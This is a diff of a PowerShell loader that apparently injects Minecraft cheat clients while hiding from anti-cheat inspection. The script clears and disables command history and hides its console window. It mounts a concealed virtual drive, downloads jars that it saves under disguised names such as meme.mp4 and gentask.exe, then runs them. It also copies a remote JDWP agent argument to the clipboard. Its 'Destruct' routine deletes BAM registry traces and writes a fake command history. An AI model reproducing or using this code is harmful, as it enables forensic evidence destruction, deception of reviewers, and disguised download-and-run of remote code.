@@ -2,6 +2,7 @@ Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
 Clear-Content -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+
 # START OF KEY BUTTON DETECTION
 Add-Type @"
 using System;
@@ -21,6 +22,7 @@ public class Win32 {
     public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 }
 "@
+
 # Hide console window
 try {
     $consolePtr = [Win32]::GetConsoleWindow()
@@ -30,10 +32,12 @@ try {
     Write-Error "Failed to hide console window: $_"
     exit 1
 }
+
 # Virtual key codes
 $VK_CONTROL = 0x11
 $VK_MENU = 0x12  # Alt key
 $VK_F11 = 0x7A
+
 # Inform user that the script is running and waiting for input
 Write-Host "Waiting for Ctrl + Alt + F11 to be pressed..."
 while ($true) {
@@ -45,6 +49,7 @@ while ($true) {
     }
     Start-Sleep -Milliseconds 100
 }
+
 # Load System.Windows.Forms assembly
 try {
     Add-Type -AssemblyName System.Windows.Forms
@@ -53,11 +58,23 @@ try {
     exit 1
 }
 # END OF KEY BUTTON DETECTION
+
 # Set preferences to run silently
 $ConfirmPreference = 'None'
 $ErrorActionPreference = 'SilentlyContinue'
+
 # SHOW LOADING SCREEN
-# Add a label to display ASCII art
+# Create a new form for loading screen
+$loadingForm = New-Object System.Windows.Forms.Form
+$loadingForm.Text = "Loading..."
+$loadingForm.Size = New-Object System.Drawing.Size(800, 300)
+$loadingForm.StartPosition = 'CenterScreen'
+$loadingForm.BackColor = 'Black'
+$loadingForm.FormBorderStyle = 'FixedDialog'
+$loadingForm.MaximizeBox = $false
+$loadingForm.MinimizeBox = $false
+
+# ASCII Art Label
 $asciiArt = @"
    __   ____  ___   ___  _____  _______
   / /  / __ \/ _ | / _ \/  _/ |/ / ___/
@@ -69,22 +86,68 @@ $label.Text = $asciiArt
 $label.Font = New-Object System.Drawing.Font("Consolas", 20)
 $label.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#eaff00")
 $label.AutoSize = $true
-# Center the label within the form
-$label.Location = New-Object System.Drawing.Point(
-    [int](($form.ClientSize.Width - $label.PreferredWidth) / 2),
-    [int](($form.ClientSize.Height - $label.PreferredHeight) / 2)
-)
-$form.Controls.Add($label)
-# Adjust the label's location when the form resizes
-$form.add_SizeChanged({
-    $label.Location = New-Object System.Drawing.Point(
-        [int](($form.ClientSize.Width - $label.PreferredWidth) / 2),
-        [int](($form.ClientSize.Height - $label.PreferredHeight) / 2)
-    )
+$label.Location = New-Object System.Drawing.Point(50, 50)
+$loadingForm.Controls.Add($label)
+
+# Loading ProgressBar
+$progressBar = New-Object System.Windows.Forms.ProgressBar
+$progressBar.Minimum = 0
+$progressBar.Maximum = 100
+$progressBar.Value = 0
+$progressBar.Style = 'Continuous'
+$progressBar.Width = 700
+$progressBar.Location = New-Object System.Drawing.Point(50, 200)
+$progressBar.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#eaff00")
+$progressBar.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#eaff00")
+$loadingForm.Controls.Add($progressBar)
+
+# Show loading form
+$loadingForm.Show()
+
+# Start time
+$startTime = Get-Date
+
+# Duration in milliseconds
+$totalDuration = 4000  # 4 seconds
+$timer = New-Object System.Windows.Forms.Timer
+$timer.Interval = 50  # Update every 50ms
+
+# Define timer tick action
+$timer.Add_Tick({
+    $elapsedTime = (Get-Date) - $startTime
+    $percentComplete = [math]::Min(100, ($elapsedTime.TotalMilliseconds / $totalDuration) * 100)
+    $progressBar.Value = $percentComplete
+
+    # Check for key press even while loading
+    $ctrlPressed = [User32]::GetAsyncKeyState($VK_CONTROL) -band 0x8000
+    $altPressed = [User32]::GetAsyncKeyState($VK_MENU) -band 0x8000
+    $f11Pressed = [User32]::GetAsyncKeyState($VK_F11) -band 0x8000
+
+    if ($ctrlPressed -and $altPressed -and $f11Pressed) {
+        $timer.Stop()
+        $progressBar.Value = 100
+        Start-Sleep -Milliseconds 200
+        $loadingForm.Close()
+    }
+
+    if ($percentComplete -ge 100) {
+        $timer.Stop()
+        Start-Sleep -Milliseconds 200
+        $loadingForm.Close()
+    }
 })
-# Show the form
-$form.Show()
+
+# Start the timer
+$timer.Start()
+
+# Run the loading form on the UI thread
+[void]$loadingForm.ShowDialog()
+
+# Stop and dispose the timer
+$timer.Stop()
+$timer.Dispose()
 # END OF LOADING SCREEN
+
 # MAKE THE PARTITION --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # Ensure the directory exists
 $vdiskPath = "C:\temp\ddr.vhd"
@@ -127,8 +190,10 @@ $partition = New-Partition -DiskNumber $disk.Number -UseMaximumSize -DriveLetter
 # Step 6: Format the volume with FAT32 and set label
 Format-Volume -DriveLetter Z -FileSystem FAT32 -NewFileSystemLabel "Local Disk" -Confirm:$false
 # END OF MAKING PARTITION ------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 # Close the old form
-$form.Close()
+$loadingForm.Close()
+
 # Hide PowerShell console window
 Add-Type -Name Win -Namespace Console -MemberDefinition @'
     [DllImport("user32.dll")]
@@ -138,6 +203,7 @@ Add-Type -Name Win -Namespace Console -MemberDefinition @'
 '@
 $consolePtr = [Console.Win]::GetConsoleWindow()
 [Console.Win]::ShowWindow($consolePtr, 0)
+
 # Create the form
 $form = New-Object System.Windows.Forms.Form
 $form.Text = 'By Zpat - FAX'
@@ -154,6 +220,7 @@ $form.Text = "By Zpat - FAX"
 # Set the top bar (title bar) color to black
 $form.BackColor = 'Black'  # Set background color for the whole form
 $form.ForeColor = 'White'  # Set text color for the form content
+
 # ASCII Art Label
 $asciiArt = @"
 ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗███╗   ███╗██████╗  ██████╗ ██╗    ██╗███╗   ██╗
@@ -165,25 +232,30 @@ $asciiArt = @"
 "@
 $label = New-Object System.Windows.Forms.Label
 $label.Text = $asciiArt
-$label.Font = New-Object System.Drawing.Font('Courier New', 9)
-$label.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#eaff00")'
+$label.Font = New-Object System.Drawing.Font('Courier New', 9, [System.Drawing.FontStyle]::Bold)
+$label.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#eaff00")
 $label.AutoSize = $true
 $label.Location = New-Object System.Drawing.Point(50, 50)
+
 # Define Main Menu Buttons
 $injectButton = New-Object System.Windows.Forms.Button
 $injectButton.Text = 'Inject'
 $injectButton.Width = 100
 $injectButton.Height = 40
 $injectButton.Location = New-Object System.Drawing.Point(162.5, 200)  # Position the button
-$injectButton.BackColor = 'Green'
-$injectButton.ForeColor = 'Black'
+$injectButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0f8353")
+$injectButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
+$injectButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
+
 $destructButton = New-Object System.Windows.Forms.Button
 $destructButton.Text = 'Destruct'
 $destructButton.Width = 100
 $destructButton.Height = 40
 $destructButton.Location = New-Object System.Drawing.Point(687.5, 200)  # Position the button
-$destructButton.BackColor = 'Red'
-$destructButton.ForeColor = 'Black'
+$destructButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#a60e0e")
+$destructButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
+$destructButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
+
 # Function to return to main menu
 function Show-MainMenu {
     $form.Controls.Clear()
@@ -191,12 +263,13 @@ function Show-MainMenu {
     $form.Controls.Add($injectButton)
     $form.Controls.Add($destructButton)
 }
+
 # Path to the custom sound file on Z drive
-$soundFilePath = "Z:\na.wav"
+$soundFilePath = "Z:\a.wav"
 
 # Function to download the sound file
 function Download-SoundFile {
-    $soundUrl = "https://github.com/devnull-sys/devnull/raw/refs/heads/main/na.wav"  # Replace with the actual URL of the sound file
+    $soundUrl = "https://github.com/devnull-sys/devnull/raw/refs/heads/main/na.wav"   # Replace with the actual URL of the sound file
     try {
         iwr -Uri $soundUrl -OutFile $soundFilePath
     } catch {
@@ -209,94 +282,119 @@ function Download-SoundFile {
 $injectButton.Add_Click({
     # Disable the form to prevent interaction
     $form.Enabled = $false
-    
+
     # Download the sound file
     Download-SoundFile
-    
+
     # Load the sound player
     $player = New-Object System.Media.SoundPlayer
     $player.SoundLocation = $soundFilePath
-    
+
     # Play the custom sound
     $player.PlaySync()
-    
+
     # Re-enable the form after sound playback
     $form.Enabled = $true
-    
     $form.Controls.Clear()
     $form.Controls.Add($label)
+
     # Back Button
     $backButton = New-Object System.Windows.Forms.Button
     $backButton.Text = 'Back'
     $backButton.Width = 100
     $backButton.Height = 40
     $backButton.Location = New-Object System.Drawing.Point(800, 320)
-    $backButton.BackColor = 'DarkRed'
-    $backButton.ForeColor = 'Black'
+    $backButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#a60e0e")
+    $backButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
+    $backButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
     $backButton.Add_Click({ Show-MainMenu })
+
     # Prestige Button
     $prestigeButton = New-Object System.Windows.Forms.Button
     $prestigeButton.Text = 'Prestige'
     $prestigeButton.Width = 120
     $prestigeButton.Height = 40
     $prestigeButton.Location = New-Object System.Drawing.Point(150, 200)
-    $prestigeButton.BackColor = 'Purple'
-    $prestigeButton.ForeColor = 'Black'
-    # Vapelite Button
-    $vapeliteButton = New-Object System.Windows.Forms.Button
-    $vapeliteButton.Text = 'VapeLite'
-    $vapeliteButton.Width = 120
-    $vapeliteButton.Height = 40
-    $vapeliteButton.Location = New-Object System.Drawing.Point(300, 200)
-    $vapeliteButton.BackColor = 'LightBlue'
-    $vapeliteButton.ForeColor = 'Black'
-    # Vapev4 Button
-    $vapev4Button = New-Object System.Windows.Forms.Button
-    $vapev4Button.Text = 'VapeV4'
-    $vapev4Button.Width = 120
-    $vapev4Button.Height = 40
-    $vapev4Button.Location = New-Object System.Drawing.Point(450, 200)
-    $vapev4Button.BackColor = 'Blue'
-    $vapev4Button.ForeColor = 'Black'
-    # Phantom Button
-    $phantomButton = New-Object System.Windows.Forms.Button
-    $phantomButton.Text = 'Phantom'
-    $phantomButton.Width = 120
-    $phantomButton.Height = 40
-    $phantomButton.Location = New-Object System.Drawing.Point(600, 200)
-    $phantomButton.BackColor = 'Red'
-    $phantomButton.ForeColor = 'Black'
-    $phantomButton.Add_Click({
-        $clipboardText = "-agentlib:jdwp=transport=dt_socket,server=n,suspend=y,address=phantom.clientlauncher.net:6550"
-        Set-Clipboard -Value $clipboardText
-    })
-    # Add buttons to form
-    $form.Controls.Add($prestigeButton)
-    $form.Controls.Add($vapeliteButton)
-    $form.Controls.Add($backButton)
-    $form.Controls.Add($vapev4Button)
-    $form.Controls.Add($phantomButton)
-    # === YOUR CUSTOM PRESTIGE LOGIC HERE ===
+    $prestigeButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#a167ff")
+    $prestigeButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
+    $prestigeButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
     $prestigeButton.Add_Click({
         if (-Not (Test-Path "Z:\meme.mp4")) {
             iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium.jar"  -OutFile "Z:\meme.mp4"
         }
         Start-Process java -ArgumentList '-jar "Z:\meme.mp4"'
     })
-    # === YOUR CUSTOM VAPELITE LOGIC HERE ===
+
+    # NewSlot Button
+    $newSlotButton = New-Object System.Windows.Forms.Button
+    $newSlotButton.Text = 'NewSlot'
+    $newSlotButton.Width = 120
+    $newSlotButton.Height = 40
+    $newSlotButton.Location = New-Object System.Drawing.Point(270, 200)
+    $newSlotButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#2563eb")
+    $newSlotButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
+    $newSlotButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
+    $newSlotButton.Add_Click({
+        if (-Not (Test-Path "Z:\cat.mp4")) {
+            #start pross
+            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium-extra/sodium-extra-fabric-0.6.1+mc1.21.4.jar" -OutFile "Z:\cat.mp4" 
+        }
+         Start-Process java -ArgumentList '-jar "Z:\cat.mp4"'
+    })
+
+    # VapeV4 Button
+    $vapev4Button = New-Object System.Windows.Forms.Button
+    $vapev4Button.Text = 'VapeV4'
+    $vapev4Button.Width = 120
+    $vapev4Button.Height = 40
+    $vapev4Button.Location = New-Object System.Drawing.Point(390, 200)
+    $vapev4Button.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#006466")
+    $vapev4Button.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
+    $vapev4Button.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
+    $vapev4Button.Add_Click({
+        if (-Not (Test-Path "Z:\gentask.exe")) {
+            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/system32/entityculling-fabric-1.7.4-mc1.21.4.jar"  -OutFile "Z:\gentask.exe"
+        }
+        Start-Process "Z:\gentask.exe"
+    })
+
+    # VapeLite Button
+    $vapeliteButton = New-Object System.Windows.Forms.Button
+    $vapeliteButton.Text = 'VapeLite'
+    $vapeliteButton.Width = 120
+    $vapeliteButton.Height = 40
+    $vapeliteButton.Location = New-Object System.Drawing.Point(510, 200)
+    $vapeliteButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#fd6a00")
+    $vapeliteButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#171317")
+    $vapeliteButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
     $vapeliteButton.Add_Click({
         if (-Not (Test-Path "Z:\ilasm.exe")) {
             iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/ProgramData/fabric-installer-1.0.3.jar"  -OutFile "Z:\ilasm.exe"
         }
         Start-Process "Z:\ilasm.exe"
     })
-    # === YOUR CUSTOM VAPEV4 LOGIC HERE ===
-    $vapev4Button.Add_Click({
-        if (-Not (Test-Path "Z:\ngentask.exe")) {
-            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/system32/entityculling-fabric-1.7.4-mc1.21.4.jar"  -OutFile "Z:\ngentask.exe"
-        }
-        Start-Process "Z:\ngentask.exe"
+
+    # Phantom Button
+    $phantomButton = New-Object System.Windows.Forms.Button
+    $phantomButton.Text = 'Phantom'
+    $phantomButton.Width = 120
+    $phantomButton.Height = 40
+    $phantomButton.Location = New-Object System.Drawing.Point(630, 200)
+    $phantomButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#4c0eb7")
+    $phantomButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
+    $phantomButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
+    $phantomButton.Add_Click({
+        $clipboardText = "-agentlib:jdwp=transport=dt_socket,server=n,suspend=y,address=phantom.clientlauncher.net:6550"
+        Set-Clipboard -Value $clipboardText
     })
+
+    # Add buttons to form
+    $form.Controls.Add($prestigeButton)
+    $form.Controls.Add($newSlotButton)
+    $form.Controls.Add($vapev4Button)
+    $form.Controls.Add($vapeliteButton)
+    $form.Controls.Add($phantomButton)
+    $form.Controls.Add($backButton)
 })
 
 # Destruct Button
@@ -368,7 +466,7 @@ assign letter=Z
     # BAM
     gp HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State | % { $_.PSObject.Properties } | ? { $_.Name -match "mmc\.exe|diskpart\.exe" } | % { ri HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State -n $_.Name }
     # Conhost History
-    Set-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 'iwr -useb https://raw.githubusercontent.com/spicetify/cli/main/install.ps1  | iex'
+    Set-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 'iwr -useb https://raw.githubusercontent.com/spicetify/cli/main/install.ps1   | iex'
     # Clear JVM args logs and traces by clearing content
     $jvmLogFiles = @(
         "$env:USERPROFILE\.java\deployment\log\*.log",
